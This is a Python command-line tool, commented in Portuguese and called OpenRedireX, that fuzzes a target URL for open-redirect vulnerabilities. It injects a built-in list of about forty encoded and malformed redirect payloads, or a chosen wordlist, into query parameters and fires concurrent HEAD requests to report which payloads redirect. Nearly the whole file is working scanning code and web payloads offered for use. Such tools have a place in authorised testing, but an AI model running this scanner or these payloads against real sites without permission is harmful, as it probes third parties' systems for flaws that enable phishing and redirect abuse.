#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import sys
import socket
import os
from aiohttp import ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects
from tqdm import tqdm
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
from typing import List
from colorama import Fore, Style, init

# Inicializa o colorama para saída colorida em diferentes plataformas
init()

# Constantes de cor
VERDE_CLARO = '\033[92m'  # Verde claro
VERDE_ESCURO = '\033[32m'  # Verde escuro
VERMELHO = Fore.LIGHTRED_EX  # Vermelho
AMARELO = Fore.LIGHTYELLOW_EX  # Amarelo
RESET = '\033[0m'  # Reseta para a cor padrão

# Payloads padrão para redirecionamento
payloads_padrao = [
    "//example.com@google.com/%2f..",
    "///google.com/%2f..",
    "///example.com@google.com/%2f..",
    "////google.com/%2f..",
    "https://google.com/%2f..",
    "https://example.com@google.com/%2f..",
    "/https://google.com/%2f..",
    "/https://example.com@google.com/%2f..",
    "//google.com/%2f%2e%2e",
    "//example.com@google.com/%2f%2e%2e",
    "///google.com/%2f%2e%2e",
    "///example.com@google.com/%2f%2e%2e",
    "////google.com/%2f%2e%2e",
    "/http://example.com",
    "/http:/example.com",
    "/https:/\\example.com/",
    "/https://\\t/example.com",
    "/https://\\example.com",
    "/https:///example.com/%2e%2e",
    "/https:///example.com/%2f%2e%2e",
    "/https://example.com",
    "/https://example.com/",
    "/https://example.com/%2e%2e",
    "/https://example.com/%2e%2e%2f",
    "/https://example.com/%2f%2e%2e",
    "/https://example.com/%2f..",
    "/https://example.com//",
    "/https:example.com",
    "/\\t/example.com",
    "/%2f%2fexample.com",
    "/%2f\\%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
    "/\\example.com",
    "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
    "/.example.com",
    "//\\t/example.com",
    "//\\example.com",
    "///\\t/example.com",
    "///\\example.com",
    "////\\t/example.com",
    "////\\example.com",
    "/////example.com",
    "/////example.com/",
    "////\\;@example.com",
    "////example.com/",
]

def listar_arquivos_txt():
    """Lista arquivos .txt na pasta atual e permite ao usuário escolher um."""
    pasta_atual = os.getcwd()
    txt_files = [f for f in os.listdir(pasta_atual) if f.endswith('.txt')]

    if not txt_files:
        print(f"{VERMELHO}\n[!] Nenhum arquivo .txt encontrado na pasta atual.{RESET}")
        sys.exit(1)

    print(f"{VERDE_CLARO}\nEscolha um arquivo de wordlist{RESET}\n")
    for idx, arquivo in enumerate(txt_files, start=1):
        print(f"\n{AMARELO}{idx} - {arquivo}{RESET}")

    while True:
        try:
            escolha = int(input(f"{VERDE_CLARO}\nDigite o número do arquivo: {RESET}"))
            if 1 <= escolha <= len(txt_files):
                return os.path.join(pasta_atual, txt_files[escolha - 1])
            else:
                print(f"{VERMELHO}\n[!] Opção inválida. Tente novamente.{RESET}")
        except ValueError:
            print(f"{VERMELHO}\n[!] Digite um número válido.{RESET}")

def carregar_wordlist():
    """Carrega a wordlist escolhida e retorna uma lista de payloads válidos."""
    arquivo = listar_arquivos_txt()
    try:
        with open(arquivo, 'r', encoding='utf-8') as f:
            payloads = [linha.strip() for linha in f.read().splitlines() if linha.strip()]
        print(f"{VERDE_CLARO}\n[+] Wordlist carregada: {os.path.basename(arquivo)}{RESET}")
        print(f"{VERDE_CLARO}\n[+] Total de payloads: {len(payloads)}{RESET}")
        return payloads
    except FileNotFoundError:
        print(f"{VERMELHO}\n[!] Erro: Arquivo não encontrado.{RESET}")
        sys.exit(1)

async def carregar_payloads(arquivo_payloads):
    """Carrega payloads de um arquivo ou retorna os padrões."""
    if arquivo_payloads:
        try:
            with open(arquivo_payloads, 'r', encoding='utf-8') as f:
                return [linha.strip() for linha in f if linha.strip()]
        except FileNotFoundError:
            print(f"{VERMELHO}\n[!] Arquivo de payloads não encontrado.{RESET}")
            sys.exit(1)
    return payloads_padrao

def fuzzificar_url(url: str, palavra_chave: str) -> str:
    """Substitui a palavra-chave na URL ou a adiciona se não estiver presente."""
    if palavra_chave in url:
        return url
    parsed_url = urlparse(url)
    params = parse_qsl(parsed_url.query)
    fuzzed_params = [(k, palavra_chave) for k, _ in params] or [("redirect", palavra_chave)]
    fuzzed_query = urlencode(fuzzed_params)
    return urlunparse(
        [parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, fuzzed_query, parsed_url.fragment])

def obter_url_usuario() -> List[str]:
    """Solicita a URL ao usuário e retorna como uma lista."""
    url = input(f"{VERDE_CLARO}Digite a URL (exemplo: https://exemplo.com/?redirect=FUZZ): {RESET}").strip()
    if not url or "://" not in url:
        print(f"{VERMELHO}\n[!] URL inválida. Use o formato correto (ex: https://exemplo.com).{RESET}")
        sys.exit(1)
    return [fuzzificar_url(url, "FUZZ")]

async def requisitar_url(session, url):
    """Faz uma requisição HEAD na URL e retorna a resposta."""
    try:
        async with session.head(url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=10)) as resposta:
            return resposta
    except (ClientConnectorError, ClientOSError, ServerDisconnectedError, ServerTimeoutError, ServerConnectionError, TooManyRedirects, socket.gaierror, asyncio.TimeoutError):
        tqdm.write(f"{VERMELHO}[!] Erro ao acessar: {url}{RESET}", file=sys.stderr)
        return None

async def processar_url(semaphore, session, url, payloads, palavra_chave, barra_progresso):
    """Processa uma URL com todos os payloads."""
    async with semaphore:
        for payload in payloads:
            url_preenchida = url.replace(palavra_chave, payload)
            resposta = await requisitar_url(session, url_preenchida)
            if resposta and resposta.history:
                redirecionamentos = " --> ".join(str(r.url) for r in resposta.history)
                if "-->" in redirecionamentos:
                    tqdm.write(f"\n{VERDE_ESCURO}[SUCESSO]{RESET} {VERDE_CLARO}{url_preenchida} redireciona para {redirecionamentos}{RESET}")
                else:
                    tqdm.write(f"\n{AMARELO}[INFO]{RESET} {url_preenchida} redireciona para {redirecionamentos}")
            barra_progresso.update()

async def processar_urls(semaphore, session, urls, payloads, palavra_chave):
    """Gerencia o processamento assíncrono de URLs."""
    total = len(urls) * len(payloads)
    with tqdm(total=total, desc="Processando", unit="url", ncols=80) as barra_progresso:
        tarefas = [processar_url(semaphore, session, url, payloads, palavra_chave, barra_progresso) for url in urls]
        await asyncio.gather(*tarefas, return_exceptions=True)

async def main(args, payloads):
    """Função principal do script."""
    urls = obter_url_usuario()
    print(f"{VERDE_CLARO}\n[+] Processando {len(urls)} URL com {len(payloads)} payloads.{RESET}\n")
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(args.concurrency)
        await processar_urls(semaphore, session, urls, payloads, args.keyword)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OpenRedireX: Fuzzer para detectar vulnerabilidades de redirecionamento aberto")
    parser.add_argument('-p', '--payloads', help='Arquivo com payloads', required=False)
    parser.add_argument('-k', '--keyword', help='Palavra-chave a ser substituída nos payloads (padrão: FUZZ)', default="FUZZ")
    parser.add_argument('-c', '--concurrency', help='Número de tarefas simultâneas (padrão: 100)', type=int, default=100)
    parser.add_argument('-w', '--use-wordlist', action='store_true', help='Usar uma wordlist da pasta atual', default=True)  # Ativado por padrão
    args = parser.parse_args()

    # Carrega os payloads
    if args.use_wordlist and not args.payloads:  # Usa wordlist por padrão, a menos que -p seja especificado
        payloads = carregar_wordlist()
    else:
        payloads = asyncio.run(carregar_payloads(args.payloads))

    # Exibe o banner
    banner = r"""
  
 ██████╗ ██████╗ ███████╗███╗   ██╗    ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║    ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝
██║   ██║██████╔╝█████╗  ██╔██╗ ██║    ██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║    ██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   
╚██████╔╝██║     ███████╗██║ ╚████║    ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝   
                                                                                                   
    """
    print(f"{VERDE_CLARO}{banner}{RESET}")

    try:
        asyncio.run(main(args, payloads))
    except KeyboardInterrupt:
        print(f"{VERMELHO}\n[!] Interrompido pelo usuário. Encerrando...{RESET}")
        sys.exit(0)

    input(f"{VERMELHO}\n\n========== PRESSIONE ENTER PARA SAIR =========={RESET}")
    
